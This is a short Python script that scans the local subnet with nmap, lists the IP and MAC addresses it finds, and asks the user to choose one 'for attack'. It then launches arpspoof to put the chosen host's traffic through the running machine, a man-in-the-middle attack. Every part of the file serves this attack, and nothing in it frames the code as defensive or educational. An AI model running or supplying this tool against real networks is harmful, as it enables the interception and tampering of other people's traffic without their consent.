#!/usr/bin/env python
# coding=utf-8
import subprocess
import re
import time

def Get_Content(cmd):
    p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
    stdoutput = p.communicate()
    pattern = stdoutput[0]
    return pattern
def GetNetwork():
    cmd = 'route'
    content = Get_Content(cmd)
    out = content.split()
    network = out[20]
    iface = out[27]
    GateWay = out[13]
    return network,iface,GateWay

def MakeCommand():
    network = GetNetwork()
    command0 = 'touch 433wifi.txt'
    command1 = network[0]+'/24'
    command2 = 'nmap -sP '+command1+' > '+'433wifi.txt '
    subprocess.Popen(command0,shell=True)
    p =  subprocess.Popen(command2,shell=True) 
    p.wait()
    Content = Read_File('433wifi.txt')
    return Content

def Read_File(File_name):
    cmd = 'cat '+File_name+" | grep 'MAC' |cut -d '(' -f 2|cut -d ')' -f 1"
    cmd1 = 'cat '+File_name+" | grep 'Nmap scan'|cut -d ' ' -f 5"
    os = Get_Content(cmd)
    OS = os.split('\n')
    ip = Get_Content(cmd1)
    IP = ip.split('\n')
    return OS,IP

def Attack():
    MakeCommand()
    Net_info = GetNetwork()
    Iface = Net_info[1]
    GateWay = Net_info[2]
    info = Read_File("433wifi.txt")
    os = info[0]
    ip = info[1]
    a=0
    while a<len(ip)-1:
        IP = str(ip[a])
        OS = str(os[a])
        print ("%d:%s %s"%(a,IP,OS))
        a=a+1
    i = raw_input("Choose ip for attack:")
    i=int(i)
    Attack_IP = ip[i]
    cmd = 'arpspoof '+'-i '+Iface+' -t '+ Attack_IP +' '+GateWay
    subprocess.Popen(cmd,shell=True)
    
Attack()